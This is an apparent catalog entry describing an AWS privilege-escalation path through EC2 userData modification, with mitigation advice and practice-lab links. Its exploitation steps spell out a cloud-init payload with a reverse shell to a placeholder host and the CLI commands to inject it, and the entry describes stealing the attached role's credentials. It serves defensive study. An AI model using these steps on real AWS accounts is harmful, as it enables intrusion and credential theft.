id: ec2-002
name: ec2:ModifyInstanceAttribute + ec2:StopInstances + ec2:StartInstances
category: existing-passrole
services:
- ec2
description: An attacker with the permissions to modify an EC2 instance's attributes, stop it, and start it can gain full control over the instance. The `ec2:ModifyInstanceAttribute` permission can be used to change an instance's userData, which is a script that normally runs on the initial boot. However with a specially crafted payload, a modified userData script can be coerced to run on subsequent restarts. To modify the userData of a running instance, it must first be stopped. The attacker can inject a malicious script (e.g., for a reverse shell) into the userData, and then start the instance to trigger its execution. This provides the attacker with code execution on the machine, allowing them to steal the credentials of any attached IAM role.
prerequisites:
  admin:
  - EC2 instance must have an instance profile attached to an IAM role
  - Target EC2 instance must have a role with administrative permissions attached
  lateral:
  - EC2 instance must have an instance profile attached to an IAM role
exploitationSteps:
  awscli:
  - step: 1
    command: |
      # Create malicious user data with cloud-init configuration
      TEXT='Content-Type: multipart/mixed; boundary="//"
      MIME-Version: 1.0

      --//
      Content-Type: text/cloud-config; charset="us-ascii"
      MIME-Version: 1.0
      Content-Transfer-Encoding: 7bit
      Content-Disposition: attachment; filename="cloud-config.txt"

      #cloud-config
      cloud_final_modules:
      - [scripts-user, always]

      --//
      Content-Type: text/x-shellscript; charset="us-ascii"
      MIME-Version: 1.0
      Content-Transfer-Encoding: 7bit
      Content-Disposition: attachment; filename="userdata.txt"

      #!/bin/bash
      bash -i >& /dev/tcp/YOUR_IP/YOUR_PORT 0>&1
      --//'
      TEXT_PATH="/tmp/text.b64.txt"
      printf "%s" "$TEXT" | base64 > "$TEXT_PATH"
    description: Create base64-encoded malicious user data with reverse shell payload
  - step: 2
    command: aws ec2 stop-instances --instance-ids $INSTANCE_ID
    description: Stop the target EC2 instance
  - step: 3
    command: aws ec2 modify-instance-attribute --instance-id "$INSTANCE_ID" --attribute userData --value "file://$TEXT_PATH"
    description: Modify the user data with the malicious script
  - step: 4
    command: aws ec2 start-instances --instance-ids $INSTANCE_ID
    description: Start the instance to trigger execution of the malicious user data
recommendation: |
  The combination of `ec2:ModifyInstanceAttribute`, `ec2:StopInstances`, and `ec2:StartInstances` is highly sensitive. IAM policies should avoid granting these permissions together, especially with wildcard resources. If necessary, use the Resource element in IAM policies to strictly limit these actions to a specific, intended set of instances. Monitor CloudTrail logs for this sequence of API calls.
limitations: |
  This path provides administrative access only if the target resource's execution role has administrative permissions. The attacker gains whatever permissions the resource's role has. If the role has limited permissions, the attacker gains limited access. However, even limited access may enable multi-hop attacks or access to sensitive data.

discoveryAttribution:
  firstDocumented:
    author: Daniel Grzelak
    date: 2016
    link: https://github.com/dagrz/aws_pwn/blob/master/elevation/bouncy_bouncy_cloudy_cloud.py
references:
- title: Bishop Fox Blog - Privilege Escalation in AWS
  url: https://bishopfox.com/blog/privilege-escalation-in-aws
- title: HackTricks - AWS - EC2 Privesc
  url: https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/aws-privilege-escalation/aws-ec2-privesc/index.html#ec2modifyinstanceattribute
permissions:
  required:
  - permission: ec2:ModifyInstanceAttribute
    resourceConstraints: Target EC2 instance must be in the Resource section
  - permission: ec2:StopInstances
    resourceConstraints: Target EC2 instance must be in the Resource section
  - permission: ec2:StartInstances
    resourceConstraints: Target EC2 instance must be in the Resource section
attackVisualization:
  nodes:
    - id: start
      label: Starting Principal
      type: principal
      description: |
        The principal with ec2:ModifyInstanceAttribute, ec2:StopInstances, and ec2:StartInstances permissions. Can be an IAM user or role. This principal will modify an existing EC2 instance's user data to inject a malicious script.

    - id: target_instance
      label: Existing EC2 Instance
      type: resource
      description: |
        An existing EC2 instance that has an IAM role attached via an instance profile. The attacker will modify this instance's user data to inject a malicious script that executes on the next boot.

    - id: attached_role
      label: Existing Role That Trusts the ec2 Service
      type: principal
      description: |
        The IAM role already attached to the target EC2 instance. This role must have an instance profile and trust ec2.amazonaws.com. When the malicious user data script executes, it has access to this role's credentials via the instance metadata service (IMDS) at http://169.254.169.254/latest/meta-data/iam/security-credentials/

    - id: method_userdata
      label: "Method 1: User Data Script Takes Action"
      type: payload
      color: '#99ccff'
      description: |
        Configure the user data script to directly perform privileged AWS API actions when it executes. The script runs with access to the attached role's credentials via IMDS and can perform any action the role permits.

        The malicious user data uses cloud-init's multipart MIME format with `cloud_final_modules: [scripts-user, always]` to force execution on subsequent boots. The script can:
        - Grant permissions to the starting principal (attach policies, create access keys)
        - Exfiltrate data from S3, RDS, DynamoDB, Secrets Manager
        - Modify security configurations
        - Any AWS API action the attached role has permissions for

    - id: method_reverse_shell
      label: "Method 2: Reverse Shell to Remote Listener"
      type: payload
      color: '#99ccff'
      description: |
        Configure the user data script to establish a reverse shell connection to an attacker-controlled server. This provides interactive remote access with the attached role's credentials.

        The malicious user data uses cloud-init configuration to force the script to execute on subsequent boots. The reverse shell command (e.g., `bash -i >& /dev/tcp/YOUR_IP/YOUR_PORT 0>&1`) connects to the attacker's listener, providing a shell session where the attacker can:
        - Query IMDS for temporary credentials
        - Execute arbitrary AWS CLI commands
        - Perform reconnaissance and data exfiltration
        - All commands execute with the attached role's permissions

    - id: admin
      label: Effective Administrator
      type: outcome
      description: |
        The attached role has administrative permissions (AdministratorAccess or equivalent). Using either exploitation method, the attacker successfully leverages these permissions to gain full administrative access to the AWS account.

    - id: some_perms
      label: Some additional access
      type: outcome
      color: '#ffeb99'
      description: |
        The attached role has some elevated permissions (but not full admin). Using either exploitation method, the attacker can leverage these permissions for data exfiltration (S3, RDS, DynamoDB), modification of security configurations, or additional privilege escalation paths.

    - id: no_access
      label: No additional access
      type: outcome
      color: '#cccccc'
      description: |
        The attached role only has minimal permissions (like logs:PutLogEvents). Regardless of the exploitation method used, the privilege escalation provides minimal value, though it could still be useful for reconnaissance.

  edges:
    - from: start
      to: target_instance
      label: ec2:StopInstances + ec2:ModifyInstanceAttribute + ec2:StartInstances
      description: |
        Stop the target EC2 instance, modify its user data with a malicious script, and start the instance to trigger execution.

        Commands:
        ```bash
        # Stop the instance
        aws ec2 stop-instances --instance-ids $INSTANCE_ID

        # Create malicious user data with cloud-init configuration
        TEXT='Content-Type: multipart/mixed; boundary="//"
        MIME-Version: 1.0

        --//
        Content-Type: text/cloud-config; charset="us-ascii"
        MIME-Version: 1.0
        Content-Transfer-Encoding: 7bit
        Content-Disposition: attachment; filename="cloud-config.txt"

        #cloud-config
        cloud_final_modules:
        - [scripts-user, always]

        --//
        Content-Type: text/x-shellscript; charset="us-ascii"
        MIME-Version: 1.0
        Content-Transfer-Encoding: 7bit
        Content-Disposition: attachment; filename="userdata.txt"

        #!/bin/bash
        # Malicious payload here
        --//'
        printf "%s" "$TEXT" | base64 > /tmp/text.b64.txt

        # Modify user data
        aws ec2 modify-instance-attribute \
          --instance-id "$INSTANCE_ID" \
          --attribute userData \
          --value "file:///tmp/text.b64.txt"

        # Start the instance
        aws ec2 start-instances --instance-ids $INSTANCE_ID
        ```

        The cloud-init configuration forces the user data script to execute on every boot (not just initial launch).

    - from: target_instance
      to: attached_role
      label: Instance assumes role
      description: |
        When the instance boots, it automatically assumes the attached IAM role. The malicious user data script executes with access to the role's temporary credentials via the instance metadata service (IMDS).

    - from: attached_role
      to: method_userdata
      label: Option A
      description: |
        Use the user data script to directly execute AWS CLI commands when the instance boots. The script has access to the attached role's credentials via IMDS and can perform privileged actions immediately.

        Example: The script could attach AdministratorAccess to the starting principal, create access keys for a privileged user, or exfiltrate sensitive data.

    - from: attached_role
      to: method_reverse_shell
      label: Option B
      description: |
        Use the user data script to establish a reverse shell connection to an attacker-controlled server. This provides interactive access with the attached role's credentials available via IMDS.

        Example: `bash -i >& /dev/tcp/YOUR_IP/YOUR_PORT 0>&1`

    - from: method_userdata
      to: admin
      label: If attached role has admin permissions
      branch: A1
      condition: admin
      description: |
        The user data script executes with AdministratorAccess permissions and successfully grants the starting principal full administrative access or performs other privileged actions.

    - from: method_userdata
      to: some_perms
      label: If attached role has some elevated permissions
      branch: A2
      condition: some_permissions
      description: |
        The user data script executes with elevated permissions and can perform privileged actions within those permissions, such as data exfiltration or security configuration changes.

    - from: method_userdata
      to: no_access
      label: If attached role has minimal permissions
      branch: A3
      condition: no_permissions
      description: |
        The user data script has minimal permissions and provides limited value for privilege escalation.

    - from: method_reverse_shell
      to: admin
      label: If attached role has admin permissions
      branch: B1
      condition: admin
      description: |
        The reverse shell successfully connects and provides access to credentials with AdministratorAccess permissions, granting full administrative access to the AWS account.

    - from: method_reverse_shell
      to: some_perms
      label: If attached role has some elevated permissions
      branch: B2
      condition: some_permissions
      description: |
        The reverse shell connects and provides access to credentials with elevated permissions that can be used for data access or further escalation.

    - from: method_reverse_shell
      to: no_access
      label: If attached role has minimal permissions
      branch: B3
      condition: no_permissions
      description: |
        The reverse shell connects but the credentials have minimal permissions and provide limited value for privilege escalation.
learningEnvironments:
  pathfinder-labs:
    type: open-source
    githubLink: https://github.com/DataDog/pathfinder-labs
    scenario: "privesc-one-hop/to-admin/ec2-modifyinstanceattribute+stopinstances+startinstances"
    description: "Deploy Terraform into your own AWS account to practice this attack path"
  pwnedlabs:
    type: closed-source
    description: "Hosted cloud security labs with AWS privilege escalation scenarios"
    scenario: https://pwnedlabs.io/labs/command-injection-to-ec2-user-data-privilege-escalation
    scenarioPricingModel: paid
